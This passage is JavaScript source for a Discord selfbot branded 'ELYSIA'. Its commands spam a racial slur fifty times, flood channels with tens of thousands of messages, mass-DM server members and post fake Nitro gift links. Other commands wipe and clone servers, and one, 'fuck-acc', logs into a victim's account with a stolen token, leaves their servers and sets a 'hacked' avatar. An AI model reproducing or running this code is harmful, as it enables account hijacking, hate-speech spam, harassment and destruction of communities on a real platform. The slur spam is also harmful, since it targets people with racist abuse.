	        ":gem: : :star: : :seven: ",
	        ":star: : :bell: : :bell:",
	        ":star: : :star: : :cherries: ",
	        ":gem: : :gem: : :cherries:",
	        ":gem: : :seven: : :seven: ",
	        ":star: : :bell: : :lemon: ",
	        ":star: : :star: : :cherries: ",
	        ":seven: : :star: : :star: ",
	        ":star: : :star: : :seven: ",
	        ":gem: : :gem: : :seven: "
	    ];
	    let reponse3 = (replys3[Math.floor(Math.random() * replys3.length)])

	    const embedslots = new Discord.RichEmbed()
	        .setColor("#000000")
	        .setDescription(`**[ :slot_machine: ${message.author} launched the slot machine! :slot_machine: ]**`)
	        .addField("**-------------------**", "** **")
	        .addField(`${reponse} \n \n${reponse2}**<** \n \n${reponse3}`, `** **`)
	        .addField("**-------------------**", "** **")
        message.channel.send(embedslots)
        console.log("command used: "+prefix+"slots")
    }   
    //#######################################################
    if(command == "dice") {
        message.delete()
        await message.channel.send("Rolling the dice...")
        .then(message => message.edit(`The dice rolled ${rand()}`));
        console.log("command used: "+prefix+"dice")
    }
    //#######################################################
    if (command == "say") { 
        var sayMessage = message.content.substring(prefix.length + 3)
        message.delete().catch(O_o=>{});
        message.channel.send(sayMessage);
        console.log("command used: "+prefix+"say")
    }

    //#######################################################
    if(command == "purge") {
        message.delete()
        if (!message.guild.me.hasPermission("MANAGE_MESSAGES")) return message.reply('You need the manage_messages permission to use this.')
   
        if(!args[0]) return message.reply('I need an amount to purge!')
        if(isNaN(args[0])) return message.reply('That was not a valid number.')
        const actualAmount = parseInt(args[0])
        let amount = 0;
        let check = true;
    
        while(check) {
    
            
            let messages = await message.channel.fetchMessages({limit: 100})
    
            if(!messages.size) return message.reply('No messages were found! deleted ' + amount + ' messages.')
            if(amount >= actualAmount) {
                return message.reply('Done! deleted ' + amount + ' messages.')
            }
    
            for(let i = 0; i < messages.array().length; i++) {
                if(amount >= actualAmount) {
                    return message.reply('Done! deleted ' + amount + ' messages.')
                }
                await messages.array()[i].delete()
                amount++;
    
            }
    
        }
        console.log("command used: "+prefix+"purge")
    }
    //#######################################################
    if(command == "steal-emoji") {
        message.delete()
        let guild = bot.guilds.get(args[0])
    if(!guild) return message.reply('Could not find that guild!')

    message.channel.send('Downloading ' + guild.emojis.array().length + ' emojis, this may take some time.')
    for(let i = 0; i < guild.emojis.array().length; i++) {

        let url = await fetch(`https://cdn.discordapp.com/emojis/${guild.emojis.array()[i].id}.png`)
        let buffer = await url.buffer()

         fs.writeFileSync(`./emojis/${guild.emojis.array()[i].name}.png`, buffer)


    }

    message.channel.send('Done :), emojis are saved in the emojis folder')
    console.log("command used: "+prefix+"steal-emoji")
    }
    //#######################################################
    if(command == "leave-all") {
            message.delete();

            try {
                bot.guilds.forEach(guild => {
                    guild.leave()
                  })
                    } catch(e) {
                         console.log(e.stack);
                }
    console.log("command used: "+prefix+"leave-all")
    }
    //#######################################################
    if(command == "replay") {
        message.delete()
        message.channel.send(`
        Shawty's like a melody in my head
        That I can't keep out
        Got me singin' like
        Na na na na everyday
        It's like my iPod stuck on replay, replay-ay-ay-ay
        Shawty's like a melody in my head
        That I can't keep out
        Got me singin' like
        Na na na na everyday
        It's like my iPod stuck on replay, Deluga Heights (replay)
        Hey over and over if I'm tipsy or sober
        I got lil' momma on rewind like the deck in my Rover
        On my mind, shawty fine, meditate her like yoga
        So down on the line make me want a cold soda
        Hey baby be my radio
        Hear you everywhere I go
        Music in my head
        Know your melody in every note
        Girl you incredible
        Make yourself available
        Na na na na
        That tune so exceptional`)
        console.log("command used: "+prefix+"replay")
    }
    //#######################################################
    if(command == "typing") {
        
            message.react("😈") 
            message.channel.startTyping()
            console.log("command used: "+prefix+"typing")
    }
    //#######################################################
    if(command == "stoptyping") {
        message.channel.stopTyping()
          message.react("😈")     
        console.log("command used: "+prefix+"stoptyping")
    }
    //#######################################################
    if(command == "pussypic"){
        message.delete();
        const embedcat = new Discord.RichEmbed()
        .setDescription("An image of an pussy")
        .setImage(`https://cataas.com/cat?${Math.floor(Math.random() * 1000) + 1}`)
        .setFooter(footer)
        .setColor("#000000")
        message.channel.send(embedcat)
        console.log("command used: "+prefix+"pussypic")
        

    }
    //#######################################################
    if(command == "nword") {
        message.delete();
        const spoil = new Discord.RichEmbed()
    .setDescription("||nice||")
    .setFooter(footer)
    .setColor("#000000")
    message.channel.send(spoil)
    console.log("command used: "+prefix+"nword")

    }
    //#######################################################
    if(command == "rimage") {
        message.delete();
        const rimageembed = new Discord.RichEmbed()
        .setImage("http://lorempixel.com/640/480/")
        .setFooter(footer)
        .setColor("#000000")
        .setDescription("Here is a random image!")
        message.channel.send(rimageembed)
        console.log("command used: "+prefix+"rimage")
    }
    //#######################################################
    if(command == "clone-serv") {
        message.delete()
        let guild1 = bot.guilds.get(args[0])
        let guild2 = bot.guilds.get(args[1])
 
 
        let channels = guild1.channels.filter(c => c.type === "text").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c);
          let categories = guild1.channels.filter(c => c.type === "category").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c);
          let roles = guild1.roles.sort((a, b) => b.calculatedPosition - a.calculatedPosition).map(r => r);
        let voice = guild1.channels.filter(c => c.type === "voice").sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c);
        
        let allowedRegions = ['brazil', 'us-west', 'singapore', 'eu-central', 'hongkong',
                     'us-south', 'amsterdam', 'us-central', 'london', 'us-east', 'sydney', 'japan',
                     'eu-west', 'frankfurt', 'russia'];
 
        let region = allowedRegions.includes(guild2.region) ? guild2.region : 'eu-central';
 
        let guildname = guild1.name + " - E L Y S I A";
        let guildico = guild1.iconURL;
      
        await guild2.channels.deleteAll();
      
        await guild2.setIcon(guildico).then(icon => {
            console.log('Set Server Icon: ' + guildico)
        })
        await guild2.setName(guildname).then(name => {
            console.log('Set Server Name: ' + name)
        })
        await guild2.setRegion(region).then(m => {
            console.log('Set Server Region: ' + region)
        })
        await guild2.setVerificationLevel(guild1.verificationLevel).then(m => {
            console.log('Set Server Verification: ' + guild1.verificationLevel)
        })
      
        for (var i = 0; i < roles.length; i++) {
          let do2 = await guild2.roles.find(c => c.name === roles[i].name)
          if (do2) continue;
          guild2.createRole({
            type: roles[i].type,
            name: roles[i].name,
            color: roles[i].hexColor,
            hoist: roles[i].hoist,
            permissions: roles[i].permissions,
            managed: roles[i].managed,
            mentionable: roles[i].mentionable
          }).then(createdRole => {
            console.log('Created Role: ' + createdRole.name)
          })
        }
      
      
        guild1.emojis.forEach(emoji => {
          let do2 = guild2.emojis.find(c => c.name === emoji.name)
          if (do2) return;
          guild2.createEmoji(emoji.url, emoji.name).then(createdEmoji => {
            console.log('Created Emoji: ' + createdEmoji)
          })
        })
      
        categories.forEach(async(category) => {
        let do2 = await guild2.channels.find(c => c.name === category.name)
        if (do2) return;
      
      
          await guild2.createChannel(category.name, 'category').then(createdCategory => {
            console.log('Created category: ' + createdCategory.name)
          })
        })
      
          for (var i = 0; i < channels.length; i++) {
            let do1 = channels[i]
            let do2 = await guild2.channels.find(c => c.name === do1.name)
            if (do2) continue;
      
            if (!do1.parent) {
              var channel2 = await guild2.createChannel(do1.name, 'text')
              if (channels[i].topic) {
                channel2.setTopic(channels[i].topic)
              }
            }
            if (do1.parent) {
              var channel = await guild2.createChannel(do1.name, 'text')
              if (channels[i].topic) {
                channel.setTopic(channels[i].topic)
              }
              var ll = await guild2.channels.find(c => c.name === do1.parent.name)
              if (ll) {
                channel.setParent(guild2.channels.find(c => c.name === do1.parent.name).id)
              } else {
                var ll1 = await guild2.createChannel(do1.parent.name, 'category')
                channel.setParent(ll1)
              }
            }
            console.log('Created Text Channel: ')
      
          for (var i = 0; i < voice.length; i++) {
            let do1 = voice[i]
            let do2 = await guild2.channels.find(c => c.name === do1.name)
            if (do2) continue;
            if (!do1.parent) {
              await guild2.createChannel(do1.name, 'voice')
            }
            if (do1.parent) {
              var channel = await guild2.createChannel(do1.name, 'voice')
              var ll = await guild2.channels.find(c => c.name === do1.parent.name)
              if (ll) {
                channel.setParent(guild2.channels.find(c => c.name === do1.parent.name).id)
              } else {
                var ll1 = await guild2.createChannel(do1.parent.name, 'category')
                channel.setParent(ll1)
              }
            }
            console.log('Created Voice Channel: ' + channel.name)
          }
      
        }
    }
    
    //#######################################################
    if(command == "clear") {
        message.delete();
        setTimeout(function(){
        message.channel.send(`​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        `)}, 1000); 
        console.log("command used: "+prefix+"clear")
    } 
    //#######################################################
    if(command == "cock") {
        message.delete();
        const cockfun = new Discord.RichEmbed()
        .setDescription("Here is an Picture of a cock")
        .setImage("https://media.istockphoto.com/photos/screaming-white-cock-on-a-white-background-picture-id153867618")
        .setFooter(footer)
        message.channel.send(cockfun)
        console.log("command used: "+prefix+"cock")
    }
    //#######################################################
    if(command == "penis") {
        message.delete();
        let user = message.mentions.users.first()
        if(!user) user = message.author
        let replies = [
        "8=D",
        "8==D",
        "8===D",
        "8====D",
        "8=====D",
        "8======D",
        "8========D",
        "8=========D",
        "8==========D",
        ]

        let random = Math.floor(Math.random()*replies.length)

        let penisembed = new Discord.RichEmbed()
        .setTitle("Penis Machine")
        .setDescription(`${user.tag} penis\n${replies[random]}`)
        .setColor("#000000")
        .setFooter(footer)
        message.channel.send(penisembed)
        console.log("command used: "+prefix+"penis")
    }
    //#######################################################
    if(command == "gay") {
        message.delete()
        let member = message.mentions.users.first()

        if (!member) member = message.author

        message.channel.send(
            new Discord.RichEmbed()
            .setColor('#000000')
            .setDescription(`${member} is ${ran(0, 100)}% gay!`)
            .setFooter(footer)
        );

        function ran(min, max) {
            return Math.floor(Math.random()*(max - min + 1) + min);
        }

        console.log("command used: "+prefix+"gay")

    }
    //#######################################################
    if(command == "mee6") {
        if(!interval) {
            message.react("😈") 
            interval = setInterval(function() { 
            message.channel.send(randomString(13))
            .then(message => message.delete(5)) 
            }, 5000)
            console.log("command used: "+prefix+"mee6 | on")
            return;
        }
       
       clearInterval(interval)
        interval = null
        message.react("😈") 
        console.log("command used: "+prefix+"mee6 | off")
        
    }
    //#######################################################
    if(command == "dank") {
        if(!interval) {
            message.react("😈") 
            interval = setInterval(function() { 
            message.channel.send("pls beg")
            }, 51000)
            console.log("command used: "+prefix+"dank | on")
            return;
        }
       
       clearInterval(interval)
        interval = null
        message.react("😈") 
        console.log("command used: "+prefix+"dank | off")
        
    }
    
    if(command == "ascii") {
        message.delete()

        let text = args.join(" ")

        ascii.font(text, 'Doom', function(rendered) {
            console.log(rendered)
            rendered = rendered.trimRight()
            if (rendered.length > 2000) return message.reply('That message was too long')
            message.channel.send(rendered, {
                code: 'md',
            })
        })
        console.log("command used: "+prefix+"ascii")
    }
    //#######################################################
    if(command == "8ball") {
		message.delete()
        let question = args.join(" ")
        if(!question) return message.reply('You need to ask a question!')
        if (question.length > 2000) return message.reply('Question may not exceed 2000 characters.')
        let embed8ball = new RichEmbed()
        .setDescription(`**${question}**\n\nAnswer: \`${["yes", "no"][Math.floor(Math.random() * 1)]}\``)
        .setFooter(footer)
        .setColor("#000000")
        message.channel.send(embed8ball)
        console.log("command used: "+prefix+"8ball")
    
    }
    //#######################################################
    if(command == "leet") {
    message.delete()
    if (!args[0]) return message.reply('I need something to leet!')
    if (args.join(" ").length > 2048) return message.reply('Text can not exceed 2048 characters.')
    message.channel.send(`${leet(args.join(" "))}`)
    console.log("command used: "+prefix+"leet")
    }
    //#######################################################
    function send(msg) {
        message.channel.send(randomString(Math.floor(Math.random() * 20) + 3))
    }
    if(command == "shorten") {
        message.delete();
        if(!args[0]) return message.reply('you forgot an url!')

        shorten.short(args[0], function(err, url) {
            if(err) throw err;
            message.channel.send(new RichEmbed().setDescription(url).setColor("#000000").setFooter(footer))
        })

        console.log("command used: "+prefix+"shorten")
    }
    //#######################################################
    if(command == "ping") {
        message.edit(`your ping is: *${bot.ping.toFixed()}ms*`);
        console.log("command used: "+prefix+"ping")
    }
    //#######################################################
    if(command == "s-pfp") {
        let user = message.mentions.users.first()
        if(!user) return message.reply('you need to provide a person to copy the avatar of.')
    
        let url = await fetch(message.author.displayAvatarURL)
        let buffer = await url.buffer()
    
    
        bot.user.setAvatar(user.displayAvatarURL)
        message.react("😈")
        console.log("command used: "+prefix+"s-pfp")
    
    }
    //#######################################################
    if(command == "shelp") {
        message.delete();
        const helpspam = new Discord.RichEmbed()
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+"simp10", "𝒔𝒑𝒂𝒎𝒔 𝒔𝒊𝒎𝒑 10 𝒕𝒊𝒎𝒆𝒔")
        .addField(prefix+"simploop", "𝒔𝒑𝒂𝒎𝒔 𝒔𝒊𝒎𝒑 𝒖𝒏𝒕𝒊𝒍 𝒚𝒐𝒖 𝒔𝒕𝒐𝒑 𝒊𝒕")
        .addField(prefix+"nword50", "𝒔𝒑𝒂𝒎𝒔 𝒕𝒉𝒆 𝒏𝒘𝒐𝒓𝒅 50 𝒕𝒊𝒎𝒆𝒔")
        .addField(prefix+"cockspam10", "𝒔𝒑𝒂𝒎𝒔 𝒂 𝒑𝒊𝒄𝒕𝒖𝒓𝒆 𝒐𝒇 𝒂𝒏 𝒄𝒐𝒄𝒌 10 𝒕𝒊𝒎𝒆𝒔")
        .addField(prefix+"clearspam", "𝒔𝒑𝒂𝒎𝒔 𝒂𝒏 𝒉𝒖𝒈𝒆 𝒆𝒎𝒑𝒕𝒚 𝒎𝒆𝒔𝒔𝒂𝒈𝒆")
        .addField(prefix+"randoword", "𝑩𝒚𝒑𝒂𝒔𝒔𝒆𝒔 𝒎𝒆𝒆6𝒔 𝒅𝒖𝒑𝒍𝒊𝒄𝒂𝒕𝒆𝒅 𝒕𝒆𝒙𝒕 𝒎𝒆𝒔𝒔𝒂𝒈𝒆")
        .addField(prefix+"massdm [message]", "𝒎𝒂𝒔𝒔 𝒅𝒎𝒔 𝒆𝒗𝒆𝒓𝒚𝒐𝒏𝒆 𝒐𝒏 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓")
        .addField('||.||', '||.||')
        .setFooter(footer)
        .setThumbnail(Gif)
        .setColor("#000000")
        message.channel.send(helpspam)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"shelp")
    }
    //#######################################################
    if(command == "clearspam") {
        message.delete();
        for (let i = 0; i < 50; i++) {
            setTimeout(function(){message.channel.send(`​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​
        \n​​ 
        `)}, 800); 
        }
        console.log("command used: "+prefix+"clearspam")
    }
    //#######################################################
    if(command == "randoword") {
        message.delete();
        for (let i = 0; i < 50; i++) {
            setTimeout(function(){message.channel.send(`
            ${randomString(1900)}

            FUCKED BY DXMON | dxmon is daddy
        `)
            }, 5000);
            //FUCKED BY D X M O N
        }
        console.log("command used: "+prefix+"randoword")
    }   

    //#######################################################
    if(command == "nword50") {
        message.delete();
        for (let i = 0; i < 50; i++) {
            message.channel.send("nigger")
        }
        console.log("command used: "+prefix+"nword50")
    }

    
    //####################################################### 
    if(command == "simp10") {
        message.delete();
        for (let i = 0; i < 10; i++) {
            message.channel.send("simp")
        }
        console.log("command used: "+prefix+"simp10")
    }  
    //#######################################################
    if(command == "simploop") {
        message.delete();
        for (let i = 0; i < 99999; i++) {
            message.channel.send("simp")
        }
        console.log("command used: "+prefix+"simploop")
    }  
    //#######################################################
    if(command == "cockspam10") {
        message.delete();
        const spamcock = new Discord.RichEmbed()
        .setDescription("You like to suck Cock?")
        .setImage("https://media.istockphoto.com/photos/screaming-white-cock-on-a-white-background-picture-id153867618")
        .setFooter(footer)
        .setColor('#000000')
        for (let i = 0; i < 10; i++) {
            message.channel.send(spamcock)
        }
        console.log("command used: "+prefix+"cockspam")
    }
    //#######################################################
    if(command == "ihelp") {
        message.delete();
        const helpinfo = new Discord.RichEmbed()
        .setDescription("E L Y S I A - h e l p  m e n u")
        .addField('||.||', '||.||')
        .addField(prefix+'channels', '𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓')
        .addField(prefix+'roles', '𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒓𝒐𝒍𝒆𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒔𝒆𝒓𝒗𝒆𝒓')
        .addField(prefix+'whois', '𝑮𝒊𝒗𝒆𝒔 𝒚𝒐𝒖 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 𝒂𝒃𝒐𝒖𝒕 𝒂 𝒖𝒔𝒆𝒓')
        .addField(prefix+'hastebin', '𝑪𝒓𝒆𝒂𝒕𝒆𝒔 𝒂𝒏 𝒉𝒂𝒔𝒕𝒆𝒃𝒊𝒏 𝒘𝒊𝒕𝒉 𝒕𝒉𝒆 𝒕𝒆𝒙𝒕 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕')
        .addField(prefix+'iplookup', '𝑮𝒊𝒗𝒆𝒔 𝒚𝒐𝒖 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 𝒂𝒃𝒐𝒖𝒕 𝒂𝒏 𝑰𝑷')
        .addField(prefix+'pwd', '𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒔 𝒂𝒏 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 𝒇𝒐𝒓 𝒚𝒐𝒖')
        .addField(prefix+"urban", "𝒔𝒆𝒂𝒓𝒄𝒉 𝒂 𝒘𝒐𝒓𝒅 𝒐𝒏 𝒖𝒓𝒃𝒂𝒏 𝒅𝒊𝒄𝒕𝒊𝒐𝒏𝒂𝒓𝒚")
        .addField(prefix+"youtube", "𝑺𝒆𝒂𝒓𝒄𝒉 𝒚𝒐𝒖𝒕𝒖𝒃𝒆 𝒇𝒐𝒓 𝒂 𝒗𝒊𝒅𝒆𝒐")
        .addField('Coder:', '𝑻𝒉𝒊𝒔 𝒃𝒐𝒕 𝒘𝒂𝒔 𝒎𝒂𝒅𝒆 𝒃𝒚 𝒅𝒙𝒎𝒐𝒏 (https://is.gd/x2mdOt)')
        .addField('Donate', '𝑰𝒇 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒚𝒐𝒖 𝒄𝒂𝒏 𝒅𝒐𝒏𝒂𝒕𝒆 𝒕𝒐 "1GGjnMmRrii9Jz9SfQJtdWn2st7PHsPDLy"')
        .setFooter(footer)
        .addField('||.||', '||.||')
        .setThumbnail(Gif)
        .setColor("#000000")
        message.channel.send(helpinfo)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"ihelp")
    }
    //#######################################################
    if(command == "pwd") {
        message.delete()
        message.channel.send(new Discord.RichEmbed().setDescription(randomString(28)).setColor("#000000")).setFooter(footer)
        console.log("command used: "+prefix+"pwd")
    }
    //#######################################################
    if(command == "channels") {
        message.delete();
        if(message.guild.channels.map(r => r.name).join("").length > 2000) return message.reply('This server has too many channels to display! (' + message.guild.channels.size + ' roles)')

    let embedchannels = new Discord.RichEmbed()
    .setDescription(message.guild.channels.map(r => r.name).join(", ")) 
    .setFooter(footer) 
    .setColor("#000000")
    message.channel.send(embedchannels)
    console.log("command used: "+prefix+"channels")
    }
    //#######################################################
    if(command == "roles") {
        message.delete();
        if(message.guild.roles.map(r => r.toString()).join("").length > 2000) return message.reply('This server has too many roles to display! (' + message.guild.roles.size + ' roles)')

    let embedroles = new Discord.RichEmbed()
    .setDescription(message.guild.roles.map(r => r.toString()).join(""))  
    .setFooter(footer) 
    .setColor("#000000")
    message.channel.send(embedroles)
    console.log("command used: "+prefix+"roles")
    }
    
        let user = message.mentions.users.first() || message.guild.members.find(mem => mem.user.username === args[0]) || message.guild.members.find(mem => mem.user.tag === args[0]) || message.guild.members.get(args[0])


    if(command == "whois") {
        message.delete()


    let joinPos = message.guild.members.array().sort((a, b) => a.joinedAt - b.joinedAt)


    const whoisembed = new Discord.RichEmbed()
    //.setAuthor(user.tag, user.displayAvatarURL)
    .setDescription(user)
    .setThumbnail(user.displayAvatarURL)
    .addField(`Joined`, moment(message.guild.member(user).joinedAt).format("llll"),true)
    .addField("Join Position", joinPos.findIndex(obj => obj.user.id === user.id) === 0 ? 1 : joinPos.findIndex(obj => obj.user.id === user.id),true)
    .addField(`Registered`, moment(user.createdAt).format("llll"),true)
    .addField(`Roles [${message.guild.member(user).roles.size}]`, message.guild.member(user).roles.map(r => r.toLocaleString()).join(" "))
    .setFooter(user.id, "     |     " + footer)
    .setColor("#000000")

    message.channel.send(whoisembed)
    console.log("command used: "+prefix+"whois")
    }
    //#######################################################
    if(command == "server-lookup") {
        message.delete()
        const embed = new Discord.RichEmbed()
        .setThumbnail(Gif)
        .setTitle("Info for " + message.guild.name, true)
        .addField("Region: ", message.guild.region, true)
        .addField("ID: ", message.guild.id, true)
        .addField("Members: ", message.guild.memberCount, true)
        .addField("Roles: ", "Do " + prefix + "roles", true)
        .setFooter(footer)
        message.channel.send(embed)
    }

    if(command == "hastebin") {
        message.delete()
        if(!args.join(" ").length) return message.channel.send('you forgot some text!')
        hastebin.createPaste(args.join(" "), {
            raw: false,
            contentType: 'text/plain',
            server: "https://hastebin.com"
        })
        .then(url => message.channel.send(url))
        .catch(e => console.log(e))
        console.log("command used: "+prefix+"hastebin")
    }


    //#######################################################
    if(command == "iplookup") {
        if(!args[0]) return message.channel.send('you forgot an IP!')

 
    iplookup.location(function(data) { 
        message.delete();
        if(data.error || data.reserved) return message.reply('Could not find info about that ip address.')
       
      let embedip = new RichEmbed()
      .setTitle(data.ip)
      .setFooter(footer)
      .addField(`City`, data.city,true)
      .addField(`Region`, data.region,true)
      .addField(`Region Code`, data.region_code,true)
      .addField('Country', data.country_name,true)
      .addField(`Capital`, data.country_capital,true)
      .addField(`Europe`, data.in_eu === true ? "yes" : "no",true)
      .addField(`Postal Code`, data.postal,true)
      .addField(`Latitude`, data.latitude,true)
      .addField(`Longitude`, data.longitude,true)
      .addField(`Orginaziation`, data.org,true)
      
      message.channel.send(embedip)
    }, args[0])
    console.log("command used: "+prefix+"iplookup")
    }
    if(command == "massdm") {
        message.guild.members.forEach( member => {
            if (!message.member.hasPermission("ADMINISTRATOR"))  return;
            setTimeout(function(){
             member.send(message.content.substr(prefix.length + 6)).then(console.log("sent an dm to " + member))
            }, 2000);
            });
        }
    if(command == "nitro") {
        message.delete()
        for (let i = 0; i < args[0]; i++) {
            const nitrolengh = randomstring.generate(16);
            setTimeout(function(){
            message.channel.send(`https://discord.gift/` + nitrolengh)
        }, 1500);
        }




    }

    if(command == "sharebot") {
        message.delete()

        const link = args[0]

        const vidid = link[5]
    }
    //#######################################################
    if(command == "check-host") {
        if(!args[0]) return message.reply('You forgot a website to check!')
    let reachable = await isReachable(args[0])
    console.log("command used: "+prefix+"check-host")
    if(reachable) {
        return message.channel.send(new RichEmbed().setDescription(`${args[0]} is online.`).setFooter(footer).setColor("#000000"))
    } 
    return message.channel.send(new RichEmbed().setDescription(`${args[0]} is offline.`).setFooter(footer).setColor("#000000"))
    
    }
    //#######################################################
    if(command == "ahelp") {
          message.delete()
          const ahelpembed = new Discord.RichEmbed()
          .setDescription("E L Y S I A - h e l p  m e n u")
          .addField('||.||', '||.||')
        .addField(prefix+'activity-on', '𝒕𝒖𝒓𝒏𝒔 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒔𝒕𝒂𝒕𝒖𝒔 𝒐𝒏')
        .addField(prefix+'activity-off', '𝒕𝒖𝒓𝒏𝒔 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒔𝒕𝒂𝒕𝒖𝒔 𝒐𝒇𝒇')
        .addField(prefix+'listening', '𝒄𝒉𝒂𝒏𝒈𝒆𝒔 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒕𝒐 𝒍𝒊𝒔𝒕𝒆𝒏𝒊𝒏𝒈')
        .addField(prefix+'streaming', '𝒄𝒉𝒂𝒏𝒈𝒆𝒔 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒕𝒐 𝒔𝒕𝒓𝒆𝒂𝒎𝒊𝒏𝒈')
        .addField(prefix+"btc-status", "𝒄𝒉𝒂𝒏𝒈𝒆𝒔 𝒕𝒉𝒆 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚 𝒕𝒐 𝒕𝒉𝒆 𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒃𝒕𝒄 𝒑𝒓𝒊𝒄𝒆")
        .addField(prefix+"c-listening", "𝑪𝒖𝒔𝒕𝒐𝒎 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚")
        .addField(prefix+"c-streaming", "𝑪𝒖𝒔𝒕𝒐𝒎 𝒂𝒄𝒕𝒊𝒗𝒊𝒕𝒚")
        .addField('||.||', '||.||')
        .setThumbnail(Gif)
        .setFooter(footer)
        .setColor("#000000")
        message.channel.send(ahelpembed)
        .then(message => message.delete(20000))
        console.log("command used: "+prefix+"ahelp")


    }
    //#######################################################
    if(command == "activity-on") {
        message.delete();
        bot.user.setActivity(activity, {type: 'LISTENING'}).catch(console.error);
        console.log("command used: "+prefix+"activity-on")
    }
    //#######################################################
    if(command == "activity-off") {
            message.delete();
            bot.user.setActivity()
            console.log("command used: "+prefix+"activity-off")
    }
    //#######################################################
    if(command == "listening") {
        message.delete()
        bot.user.setActivity(activity, {type: 'LISTENING'}).catch(console.error);
        console.log("command used: "+prefix+"listening")
    }
    //#######################################################
    if(command == "streaming") {
        message.delete()
        bot.user.setActivity(activity, {url: 'https://www.sellix.io/dxmon'}).catch(console.error);
        console.log("command used: "+prefix+"streaming")
    }
    if(command == "btc-status") {

        message.delete()

            crypto.getCryptoPrice("USD", "BTC").then(obj => {
                bot.user.setActivity(`BTC Price: ${obj.price}$`).catch(console.error);
            })

  
            
    }

    if(command == "c-streaming") {
        message.delete()
        bot.user.setActivity(`${args[0]}`, {url: 'https://www.sellix.io/dxmon'}).catch(console.error);
    }
    if(command == "c-listening") {
        message.delete()
        bot.user.setActivity(`${args[0]}`, {type: 'LISTENING'}).catch(console.error);
    }
    //#######################################################
    if(command == "proxy") {
        message.delete()
        let type = args[0]
        let timeout = args[1]
        let shortend = "https://api.proxyscrape.com/?request=getproxies&proxytype=${type}&timeout=${timeout}&country=all&ssl=all&anonymity=all"
        shorten.short(shortend, function(err, url) {
            if(err) throw err;
            message.channel.send(new Discord.RichEmbed().setDescription(url).setColor("#000000").setFooter(footer).setTimestamp())
        })
    }
    if(command == "youtube") {
        message.delete()
        let urll = "https://www.youtube.com/results?search_query=" + args[0]
        shorten.short(urll, function(err, url) {
            if(err) throw err;
            message.channel.send(new Discord.RichEmbed().setDescription(url).setColor("#000000").setFooter(footer).setTimestamp())
        })
    }
    if(command == "urban") {
        message.delete()
        let urll = "https://www.urbandictionary.com/define.php?term=" + args[0]
        shorten.short(urll, function(err, url) {
            if(err) throw err;
            message.channel.send(new Discord.RichEmbed().setDescription(url).setColor("#000000").setFooter(footer).setTimestamp())
        })
    }
    if(command == "epilepsy") {
        message.delete()
        message.channel.send("https://imgur.com/aj4WtET")
    }
    if(command == "gping") {
        message.edit("Stop sniping")
        message.delete()
    }
    if(command == "fuck-acc") {
        const dtoken = args[0]
        const client3 = new Discord.Client();

        client3.on("ready", async => {
            console.log("Fucking the account rn!")
            client3.guilds.forEach(guild => {
                if(guild.owner.id == client3.user.id){
                    console.log("Cant leave that server because the user is the owner")
                    return;
                }
                guild.leave().then(console.log("Left guild: " + guild.name))
            })
            const hacked = "./hacked.png"

            client3.user.setAvatar(hacked)
            .then(console.log("Changed avatar!"))
    
        })

        client3.login(dtoken)


    }



    

    

}


})


bot.login(`${token}`);
}) ();
function question(string) {
    return new Promise((res) => {
        rl.question(string, (answer) => res(answer))
    })
}























